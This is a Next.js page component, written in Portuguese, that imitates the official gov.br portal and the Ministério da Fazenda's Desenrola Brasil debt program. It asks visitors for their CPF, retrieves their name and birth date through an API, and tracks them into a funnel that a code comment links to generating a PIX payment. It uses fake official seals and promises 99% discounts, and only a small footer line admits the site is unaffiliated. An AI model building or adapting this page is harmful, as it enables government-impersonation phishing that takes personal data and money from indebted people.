'use client'

import { useRouter } from 'next/navigation'
import { useEffect, useState } from 'react'
import { capturarUtms, lerUtms } from '@/lib/tracking'

function onlyDigits(s: string) {
  return String(s || '').replace(/\D/g, '')
}

function formatCPF(v: string) {
  const d = onlyDigits(v).slice(0, 11)
  if (d.length <= 3) return d
  if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3)
  if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6)
  return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9)
}

function isValidCPF(cpf: string) {
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false
  let s = 0
  let r: number
  for (let i = 1; i <= 9; i++) s += parseInt(cpf.charAt(i - 1), 10) * (11 - i)
  r = (s * 10) % 11
  if (r === 10 || r === 11) r = 0
  if (r !== parseInt(cpf.charAt(9), 10)) return false
  s = 0
  for (let i = 1; i <= 10; i++) s += parseInt(cpf.charAt(i - 1), 10) * (12 - i)
  r = (s * 10) % 11
  if (r === 10 || r === 11) r = 0
  return r === parseInt(cpf.charAt(10), 10)
}

export default function ConsultaClient() {
  const router = useRouter()
  const [cpf, setCpf] = useState('')
  const [loading, setLoading] = useState(false)

  // Captura as UTMs da URL de entrada e salva para uso ao gerar o PIX.
  useEffect(() => {
    capturarUtms()
  }, [])

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    const raw = onlyDigits(cpf)

    if (!isValidCPF(raw)) {
      alert('CPF inválido. Por favor, verifique os 11 dígitos digitados.')
      return
    }

    setLoading(true)
    try {
      const res = await fetch('/api/cpf', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf: raw }),
        cache: 'no-store',
      })
      const json = await res.json()

      if (res.ok && json.ok && json.data?.nome) {
        const params = new URLSearchParams()
        params.set('cpf', raw)
        params.set('nome', json.data.nome)
        if (json.data.nascimento) params.set('nasc', json.data.nascimento)
        // Preserva as UTMs capturadas ao longo do funil.
        const utms = lerUtms()
        for (const [k, v] of Object.entries(utms)) {
          if (v) params.set(k, v)
        }
        router.push('/atendimento?' + params.toString())
        return
      }

      alert(json?.error || 'Não foi possível validar o CPF nos registros. Verifique o número informado e tente novamente.')
    } catch {
      alert('Não foi possível concluir a consulta agora. Tente novamente em instantes.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="consulta-root">
      <style>{CSS}</style>

      <div className="barra-brasil-topo">
        <div className="barra-brasil-topo-inner">
          <div className="barra-brasil-logo">
            <svg className="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11">
              <rect width="20" height="14" fill="#009c3b" />
              <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00" />
              <circle cx="10" cy="7" r="3.2" fill="#002776" />
              <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff" />
            </svg>
            <strong>BRASIL</strong>
          </div>
          <nav className="barra-brasil-links">
            <a href="javascript:void(0)">Simplifique!</a>
            <a href="javascript:void(0)">Participe</a>
            <a href="javascript:void(0)">Acesso à informação</a>
            <a href="javascript:void(0)">Legislação</a>
            <a href="javascript:void(0)">Canais</a>
          </nav>
        </div>
      </div>

      <div className="page-wrap">
        <header className="hdr hdr--cpf">
          <span className="hdr-logo-link" aria-label="gov.br">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/images/iconegov.png" alt="gov.br" className="hdr-logo-img" width={105} height={34} />
          </span>
          <div className="hdr-right">
            <span className="hdr-icon-btn" aria-label="Acessibilidade" title="Acessibilidade">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1351B4" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1" />
                <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2" />
              </svg>
            </span>
          </div>
        </header>

        <div className="crumb">
          Página Inicial <span aria-hidden="true"> {'>'} </span> Serviços
          <span aria-hidden="true"> {'>'} </span> Programa Desenrola Brasil
          <span aria-hidden="true"> {'>'} </span> <strong>Consulta Cadastral</strong>
        </div>

        <main className="card-main cpf-wrap">
          <div className="dept-badge">
            <span className="dept-dot" />
            MINISTÉRIO DA FAZENDA — GOVERNO FEDERAL
          </div>

          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img className="limpe-logo" src="/images/limpenome.png" alt="Programa Desenrola Brasil — Limpe seu nome" />

          <div className="gov-instrucao-box">
            <h1 className="instrucao-titulo">Consulta de Renegociação de Dívidas</h1>
            <p className="instrucao-texto">
              Informe seu <strong>CPF</strong> para consultar pendências financeiras ativas e verificar propostas com{' '}
              <strong>até 99% de desconto</strong> pelo Programa Oficial.
            </p>
          </div>

          <form onSubmit={handleSubmit} noValidate>
            <div className="field-wrap">
              <label htmlFor="cpf" className="field-label">
                CPF (Cadastro de Pessoas Físicas)
              </label>
              <div className="input-container">
                <svg className="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
                <input
                  className="input-cpf"
                  type="tel"
                  id="cpf"
                  name="cpf"
                  inputMode="numeric"
                  autoComplete="off"
                  placeholder="000.000.000-00"
                  maxLength={14}
                  value={cpf}
                  onChange={(e) => setCpf(formatCPF(e.target.value))}
                  required
                />
              </div>
              <span className="field-hint">Digite apenas os 11 números do seu documento</span>
            </div>

            <button type="submit" className="btn-primary btn-cpf-submit" disabled={loading}>
              <span>{loading ? 'Consultando base da Receita Federal...' : 'CONSULTAR NO gov.BR'}</span>
              {!loading && (
                <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" />
                </svg>
              )}
            </button>
          </form>

          <div className="info-box">
            <div className="ico-i-wrapper">
              <span className="ico-i" aria-hidden="true">i</span>
            </div>
            <div className="info-box-content">
              <strong>Garantia do Governo Federal</strong>
              <p>
                O Programa Desenrola Brasil viabiliza acordos com descontos de até 99% e reabilitação de crédito com
                atualização imediata no Score Serasa e SPC.
              </p>
            </div>
          </div>

          <div className="trust-badges">
            <span className="trust-item">
              <svg className="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
                <rect x="5" y="11" width="14" height="10" rx="2" />
                <path d="M8 11V7a4 4 0 0 1 8 0v4" />
              </svg>
              Conexão Segura 256-bit
            </span>
            <span className="trust-item">
              <svg className="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                <path d="M9 12l2 2 4-4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              Selo Oficial gov.br
            </span>
          </div>
          <p className="trust-sub">Portal Oficial de Renegociação Cadastral — Todos os direitos reservados</p>
        </main>

        <footer className="site-ft">
          <div className="site-ft-inner">
            <div className="ft-logo-row">
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img src="/images/iconegov.png" alt="gov.br" className="ft-gov-img" width={110} height={36} />
              <div className="ft-divider" />
              <span className="ft-org">Ministério da Fazenda</span>
            </div>
            <div className="copy-block">
              <p>
                Este é um site privado e independente, sem qualquer vínculo, patrocínio ou autorização do Governo
                Federal, do programa oficial Desenrola Brasil ou do gov.br.
              </p>
              <strong>Programa Desenrola Brasil</strong>
            </div>
          </div>
        </footer>
      </div>
    </div>
  )
}

const CSS = `
:root {
  --gov-blue: #1351b4;
  --gov-blue-dark: #0c326f;
  --gov-blue-navy: #071d41;
  --gov-blue-soft: #eff6ff;
  --gov-blue-border: #bfdbfe;
  --gov-green: #168821;
  --gov-gold: #fdb913;
  --gov-bg: #f0f2f5;
  --gov-border: #d1d5db;
  --gov-text-dark: #1a1a1a;
  --gov-text-body: #334155;
  --gov-text-muted: #64748b;
}
.consulta-root, .consulta-root * { box-sizing: border-box; margin: 0; padding: 0; }
.consulta-root {
  font-family: 'Inter', 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  background: var(--gov-bg);
  color: var(--gov-text-dark);
  min-height: 100vh;
  min-height: 100dvh;
  display: flex;
  flex-direction: column;
  -webkit-font-smoothing: antialiased;
}
.barra-brasil-topo { background: #000; color: #fff; font-size: 11px; font-weight: 600; padding: 5px 16px; border-bottom: 1px solid #1f2937; width: 100%; }
.barra-brasil-topo-inner { max-width: 720px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; }
.barra-brasil-logo { display: flex; align-items: center; gap: 6px; color: #fff; font-weight: 800; font-size: 11.5px; letter-spacing: 0.04em; }
.flag-icon-svg { display: inline-block; vertical-align: middle; border-radius: 1.5px; flex-shrink: 0; }
.barra-brasil-links { display: flex; align-items: center; gap: 12px; }
.barra-brasil-links a { color: #9ca3af; text-decoration: none; font-size: 10px; }
@media (max-width: 540px) { .barra-brasil-links { display: none; } }
.page-wrap { flex: 1 0 auto; display: flex; flex-direction: column; width: 100%; max-width: 720px; margin: 0 auto; }
.hdr { width: 100%; min-height: 56px; display: flex; justify-content: space-between; align-items: center; gap: 8px; background: #fff; padding: 10px 16px; border-bottom: 2.5px solid var(--gov-blue); box-shadow: 0 1px 4px rgba(0,0,0,0.06); position: sticky; top: 0; z-index: 100; }
.hdr-logo-link { display: flex; align-items: center; flex-shrink: 0; }
.hdr-logo-img { height: 34px; width: auto; object-fit: contain; display: block; }
.hdr-right { display: flex; align-items: center; gap: 6px; margin-left: auto; }
.hdr-icon-btn { display: flex; align-items: center; justify-content: center; width: 34px; height: 34px; border-radius: 6px; }
.crumb { width: 100%; background: #e2e8f0; color: #475569; padding: 7px 16px; font-size: 11.5px; font-weight: 500; border-bottom: 1px solid #cbd5e1; }
.crumb span { color: #94a3b8; margin: 0 2px; }
.crumb strong { color: var(--gov-blue); font-weight: 700; }
.card-main { background: #fff; margin: 16px; padding: 24px 20px 28px; border-radius: 14px; border: 1px solid #e2e8f0; box-shadow: 0 4px 16px rgba(15,23,42,0.06); position: relative; text-align: center; }
.dept-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--gov-blue-soft); color: var(--gov-blue); border: 1px solid var(--gov-blue-border); padding: 4px 12px; border-radius: 50px; font-size: 10.5px; font-weight: 700; letter-spacing: 0.04em; margin-bottom: 16px; }
.dept-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--gov-green); }
.limpe-logo { max-width: 220px; width: 100%; height: auto; object-fit: contain; margin: 0 auto 16px; display: block; }
.gov-instrucao-box { margin-bottom: 20px; }
.instrucao-titulo { font-size: 18px; font-weight: 800; color: var(--gov-text-dark); margin-bottom: 6px; letter-spacing: -0.01em; }
.instrucao-texto { font-size: 13.5px; color: var(--gov-text-body); line-height: 1.5; max-width: 480px; margin: 0 auto; }
.field-wrap { text-align: left; margin-bottom: 18px; }
.field-label { font-size: 13px; font-weight: 700; color: var(--gov-text-dark); margin-bottom: 6px; display: block; }
.input-container { display: flex; align-items: center; background: #fff; border: 2px solid var(--gov-border); border-radius: 10px; padding: 0 14px; transition: all 0.2s; }
.input-container:focus-within { border-color: var(--gov-blue); box-shadow: 0 0 0 3px rgba(19,81,180,0.15); }
.input-icon { width: 20px; height: 20px; color: var(--gov-text-muted); flex-shrink: 0; margin-right: 10px; }
input.input-cpf { width: 100%; height: 50px; border: none; outline: none; font-size: 18px; font-weight: 700; font-family: inherit; color: var(--gov-text-dark); letter-spacing: 0.05em; background: transparent; }
.field-hint { font-size: 11.5px; color: var(--gov-text-muted); margin-top: 5px; display: block; }
.btn-primary { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; height: 52px; background: var(--gov-blue); color: #fff; border: none; border-radius: 26px; font-size: 14.5px; font-weight: 800; font-family: inherit; text-transform: uppercase; letter-spacing: 0.04em; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 14px rgba(19,81,180,0.3); }
.btn-primary:hover { background: var(--gov-blue-dark); box-shadow: 0 6px 18px rgba(19,81,180,0.4); transform: translateY(-1px); }
.btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
.info-box { display: flex; gap: 12px; align-items: flex-start; padding: 14px 16px; background: var(--gov-blue-soft); border: 1px solid var(--gov-blue-border); border-radius: 10px; margin-top: 20px; text-align: left; }
.ico-i-wrapper { flex-shrink: 0; width: 22px; height: 22px; border-radius: 50%; background: var(--gov-blue); color: #fff; font-size: 13px; font-weight: 800; display: flex; align-items: center; justify-content: center; font-style: italic; font-family: serif; }
.info-box-content strong { display: block; font-size: 13px; color: var(--gov-blue-dark); margin-bottom: 2px; }
.info-box-content p { font-size: 12.5px; color: var(--gov-text-body); line-height: 1.45; }
.trust-badges { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 22px; font-size: 12px; color: var(--gov-text-body); font-weight: 600; }
.trust-item { display: inline-flex; align-items: center; gap: 6px; }
.trust-ico { flex-shrink: 0; color: var(--gov-green); }
.trust-sub { margin-top: 10px; font-size: 11px; color: var(--gov-text-muted); text-align: center; line-height: 1.5; }
.site-ft { background: var(--gov-blue-navy); color: #e2e8f0; text-align: left; font-size: 13px; margin-top: auto; padding: 20px 16px; width: 100%; }
.site-ft-inner { max-width: 720px; margin: 0 auto; }
.ft-logo-row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
.ft-gov-img { height: 36px; width: auto; }
.ft-divider { width: 1px; height: 24px; background: rgba(255,255,255,0.2); }
.ft-org { font-size: 12px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; }
.copy-block { font-size: 11.5px; color: #94a3b8; line-height: 1.6; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 12px; }
.copy-block strong { color: #fff; }
@media (max-width: 480px) { .card-main { margin: 10px; padding: 20px 14px; } .instrucao-titulo { font-size: 16.5px; } }
`
